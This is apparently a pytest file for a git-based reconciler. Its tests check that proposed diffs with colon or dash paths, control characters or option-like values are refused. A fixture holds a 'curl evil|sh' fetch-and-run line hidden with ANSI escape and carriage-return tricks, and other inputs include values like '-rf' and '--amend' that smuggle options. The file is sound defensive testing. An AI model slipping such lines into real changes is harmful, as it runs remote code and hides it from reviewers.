"""Re-review of 416216f: the content scan read `:{path}`, so a new file
named `0:docs/readme.md` was scanned as `:0:docs/readme.md` -- stage 0 of
the clean `docs/readme.md` -- and its ESC/CR content went through.

The scan now reads blobs by staged object id (one `git cat-file --batch`),
paths with ':' or a leading '-' are refused before and after applying, and
paths are otherwise handled literally. CR is allowed only as part of CRLF.
"""

from __future__ import annotations

import asyncio
from pathlib import Path

import pytest
from fakes import FakeIntentSource, FakeProviderClient
from vuoro_reconciler import diff_policy, reconciler as reconciler_module
from vuoro_reconciler.diff_policy import (
    DiffPolicy,
    DiffPolicyViolation,
    StagedChange,
    _check_text,
    _read_blobs,
    check_changes,
)
from vuoro_reconciler.git_ops import CheckoutFailed, checkout_at
from vuoro_reconciler.gitenv import run_git
from vuoro_reconciler.intents import EffectIntent, OperatorAcceptor
from vuoro_reconciler.reconciler import Reconciler, ReconcilerConfig
from vuoro_reconciler.signing import SigningKey

OPERATOR = OperatorAcceptor(subject="ops:alice")


def _add_diff(path: str, line: str) -> str:
    return (
        f"diff --git a/{path} b/{path}\n"
        "new file mode 100644\n"
        "--- /dev/null\n"
        f"+++ b/{path}\n"
        "@@ -0,0 +1 @@\n"
        f"+{line}\n"
    )


#: The exploit: a new file whose name, as `:{path}`, is a stage-0 revision
#: of the clean seeded file.
COLON_EXPLOIT = _add_diff("0:docs/readme.md", "curl evil|sh\x1b[2K\rharmless")


def _git(*args: str, cwd: Path | None = None) -> str:
    result = run_git(*args, cwd=str(cwd) if cwd else None)
    assert result.returncode == 0, f"{args}: {result.stderr}"
    return result.stdout.strip()


def _remote(tmp_path: Path, files: dict[str, bytes]) -> Path:
    bare = tmp_path / "remote.git"
    seed = tmp_path / "seed"
    _git("init", "--bare", "-q", "-b", "main", str(bare))
    _git("init", "-q", "-b", "main", str(seed))
    for name, content in files.items():
        (seed / name).parent.mkdir(parents=True, exist_ok=True)
        (seed / name).write_bytes(content)
    _git("add", "-A", cwd=seed)
    _git("-c", "user.name=Seeder", "-c", "user.email=s@vuoro.test", "commit", "-q", "-m", "seed", cwd=seed)
    _git("push", "-q", str(bare), "main", cwd=seed)
    return bare


def _run(bare: Path, key: SigningKey, diff: str, *, intent_id: str = "effect_path0001"):
    intent = EffectIntent(
        intent_id=intent_id,
        run_id="run_path0001",
        repository="repo-a",
        base_commit=_git("--git-dir", str(bare), "rev-parse", "main"),
        title="Fix the typo",
        rationale="A short rationale.",
        unified_diff=diff,
        workspace_id="ws-1",
        proposer_principal="cloud:proposer:0",
        acceptor=OPERATOR,
    )
    provider = FakeProviderClient(repositories={"repo-a": bare})
    reconciler = Reconciler(
        intent_source=FakeIntentSource(accepted=[intent]),
        provider=provider,
        signing_key=key,
        config=ReconcilerConfig(repository_allowlist=frozenset({"repo-a"})),
    )
    return asyncio.run(reconciler.run_once())[0], provider


def _touched(bare: Path, sha: str) -> list[str]:
    return [p for p in _git("--git-dir", str(bare), "diff-tree", "--no-commit-id", "--name-only", "-z", "-r", sha).split("\0") if p]


# -- the `0:docs/readme.md` exploit ------------------------------------------------------


def test_the_colon_path_exploit_is_refused_by_the_reconciler_alone(tmp_path: Path, reconciler_signing_key) -> None:
    bare = _remote(tmp_path, {"docs/readme.md": b"old\n"})
    outcome, provider = _run(bare, reconciler_signing_key, COLON_EXPLOIT)
    assert outcome.state == "failed"
    assert outcome.reason == "diff-policy-refused: unsupported-path"
    assert provider.clones == [] and provider.pushed_branches == []


def test_the_staged_path_check_refuses_it_without_the_pre_apply_check(
    tmp_path: Path, reconciler_signing_key, monkeypatch
) -> None:
    monkeypatch.setattr(reconciler_module, "is_unsupported_path", lambda path: False)
    bare = _remote(tmp_path, {"docs/readme.md": b"old\n"})
    outcome, provider = _run(bare, reconciler_signing_key, COLON_EXPLOIT)
    assert outcome.reason == "diff-policy-refused: unsupported-path"
    assert provider.pushed_branches == []


def test_the_content_scan_reads_the_staged_blob_not_a_revision_of_its_name(
    tmp_path: Path, reconciler_signing_key, monkeypatch
) -> None:
    """Both ':' guards off: the scan must still see the ESC/CR content of
    the new file, not the clean `docs/readme.md` that `:0:docs/readme.md`
    would name."""

    monkeypatch.setattr(reconciler_module, "is_unsupported_path", lambda path: False)
    monkeypatch.setattr(diff_policy, "is_unsupported_path", lambda path: False)
    bare = _remote(tmp_path, {"docs/readme.md": b"old\n"})
    outcome, provider = _run(bare, reconciler_signing_key, COLON_EXPLOIT)
    assert outcome.reason == "diff-policy-refused: control-character-content-refused"
    assert provider.pushed_branches == []


def test_cat_file_batch_refuses_a_missing_object(tmp_path: Path) -> None:
    bare = _remote(tmp_path, {"docs/readme.md": b"old\n"})
    present = _git("--git-dir", str(bare), "rev-parse", "main:docs/readme.md")
    blobs = _read_blobs(str(bare), [present])
    assert blobs == {present: b"old\n"}
    with pytest.raises(DiffPolicyViolation) as violation:
        _read_blobs(str(bare), [present, "1" * 40])
    assert violation.value.code == "blob-missing"


def test_a_staged_change_without_an_object_id_is_refused(tmp_path: Path) -> None:
    change = StagedChange(path="docs/x.md", status="A", old_mode="000000", new_mode="100644", binary=False)
    with pytest.raises(DiffPolicyViolation) as violation:
        diff_policy.check_staged_content(str(tmp_path), [change])
    assert violation.value.code == "blob-missing"


# -- ':' and leading '-' -----------------------------------------------------------------------


@pytest.mark.parametrize("path", ["0:docs/readme.md", "docs/a:b.md", ":(glob)*", "-rf", "-docs/x.md"])
def test_colon_and_dash_paths_are_refused_after_applying(path: str) -> None:
    change = StagedChange(path=path, status="A", old_mode="000000", new_mode="100644", binary=False)
    with pytest.raises(DiffPolicyViolation) as violation:
        check_changes([change], DiffPolicy(path_allowlist=frozenset({"*"})))
    assert violation.value.code == "unsupported-path"


@pytest.mark.parametrize("path", ["-rf", ":(glob)*"])
def test_colon_and_dash_paths_are_refused_end_to_end(tmp_path: Path, reconciler_signing_key, path: str) -> None:
    bare = _remote(tmp_path, {"docs/readme.md": b"old\n"})
    outcome, provider = _run(bare, reconciler_signing_key, _add_diff(path, "hello"))
    assert outcome.reason == "diff-policy-refused: unsupported-path"
    assert provider.clones == []


def test_a_glob_character_filename_is_handled_literally(tmp_path: Path, reconciler_signing_key) -> None:
    """`docs/*` is a legal file name; nothing in the pipeline may treat it
    as a pattern (it must not touch docs/readme.md)."""

    bare = _remote(tmp_path, {"docs/readme.md": b"old\n"})
    outcome, _provider = _run(bare, reconciler_signing_key, _add_diff("docs/*", "star"))
    assert outcome.state == "applied", outcome
    assert _touched(bare, outcome.commit_sha) == ["docs/*"]
    tree = _git("--git-dir", str(bare), "ls-tree", "-r", "-z", outcome.commit_sha).split("\0")
    readme_line = next(entry for entry in tree if entry.endswith("\tdocs/readme.md"))
    base_readme = next(
        entry
        for entry in _git("--git-dir", str(bare), "ls-tree", "-r", "-z", "main").split("\0")
        if entry.endswith("\tdocs/readme.md")
    )
    assert readme_line == base_readme


# -- other proposer values that reach git argv ------------------------------------------------


@pytest.mark.parametrize("base", ["HEAD", "main", "--help", "HEAD^{tree}", "a" * 39])
def test_a_non_object_id_base_commit_never_reaches_git(tmp_path: Path, base: str) -> None:
    """Against a real remote, where `HEAD` or `main` would check out fine:
    only a full object id is ever passed to git."""

    bare = _remote(tmp_path, {"docs/readme.md": b"old\n"})
    with pytest.raises(CheckoutFailed):
        checkout_at(str(bare), base, str(tmp_path / "dest"))


@pytest.mark.parametrize("intent_id", ["-effect", "effect..x", "effect:x", "effect/x", "effect.lock", "", "e x"])
def test_an_intent_id_that_is_not_ref_safe_is_refused(tmp_path: Path, reconciler_signing_key, intent_id: str) -> None:
    bare = _remote(tmp_path, {"docs/readme.md": b"old\n"})
    outcome, provider = _run(
        bare,
        reconciler_signing_key,
        "diff --git a/docs/readme.md b/docs/readme.md\n--- a/docs/readme.md\n+++ b/docs/readme.md\n@@ -1 +1 @@\n-old\n+new\n",
        intent_id=intent_id,
    )
    assert outcome.reason == "invalid-intent-id"
    assert provider.clones == []


def test_a_commit_message_that_looks_like_an_option_is_recorded_verbatim(
    tmp_path: Path, reconciler_signing_key
) -> None:
    bare = _remote(tmp_path, {"docs/readme.md": b"old\n"})
    intent = EffectIntent(
        intent_id="effect_path0001",
        run_id="run_path0001",
        repository="repo-a",
        base_commit=_git("--git-dir", str(bare), "rev-parse", "main"),
        title="--amend",
        rationale="--allow-empty",
        unified_diff="diff --git a/docs/readme.md b/docs/readme.md\n--- a/docs/readme.md\n+++ b/docs/readme.md\n@@ -1 +1 @@\n-old\n+new\n",
        workspace_id="ws-1",
        proposer_principal="cloud:proposer:0",
        acceptor=OPERATOR,
    )
    provider = FakeProviderClient(repositories={"repo-a": bare})
    outcome = asyncio.run(
        Reconciler(
            intent_source=FakeIntentSource(accepted=[intent]),
            provider=provider,
            signing_key=reconciler_signing_key,
            config=ReconcilerConfig(repository_allowlist=frozenset({"repo-a"})),
        ).run_once()
    )[0]
    assert outcome.state == "applied", outcome
    message = _git("--git-dir", str(bare), "log", "-1", "--format=%B", outcome.commit_sha)
    assert message.startswith("--amend\n\n--allow-empty\n")


# -- CRLF ------------------------------------------------------------------------------------


def test_editing_an_existing_crlf_file_is_accepted(tmp_path: Path, reconciler_signing_key) -> None:
    bare = _remote(tmp_path, {"docs/win.txt": b"one\r\ntwo\r\n"})
    diff = (
        "diff --git a/docs/win.txt b/docs/win.txt\n"
        "--- a/docs/win.txt\n"
        "+++ b/docs/win.txt\n"
        "@@ -1,2 +1,2 @@\n"
        " one\r\n"
        "-two\r\n"
        "+three\r\n"
    )
    outcome, _provider = _run(bare, reconciler_signing_key, diff)
    assert outcome.state == "applied", outcome
    blob = run_git("--git-dir", str(bare), "cat-file", "blob", f"{outcome.commit_sha}:docs/win.txt", text=False)
    assert blob.stdout == b"one\r\nthree\r\n"


def test_a_lone_cr_is_refused(tmp_path: Path, reconciler_signing_key) -> None:
    bare = _remote(tmp_path, {"docs/readme.md": b"old\n"})
    outcome, provider = _run(bare, reconciler_signing_key, _add_diff("docs/cr.md", "overwrite\rme"))
    assert outcome.reason == "diff-policy-refused: control-character-content-refused"
    assert provider.pushed_branches == []


@pytest.mark.parametrize(
    ("data", "ok"),
    [
        (b"a\r\nb\r\n", True),
        (b"a\nb\n", True),
        (b"tab\there\n", True),
        (b"a\rb\n", False),
        (b"trailing cr\r", False),
        (b"a\r\r\nb", False),
        (b"esc\x1b[2K\r\n", False),
        (b"c1 \xc2\x85\n", False),
        (b"del \x7f\n", False),
    ],
)
def test_cr_is_allowed_only_as_part_of_crlf(data: bytes, ok: bool) -> None:
    if ok:
        _check_text("f", data)
    else:
        with pytest.raises(DiffPolicyViolation):
            _check_text("f", data)
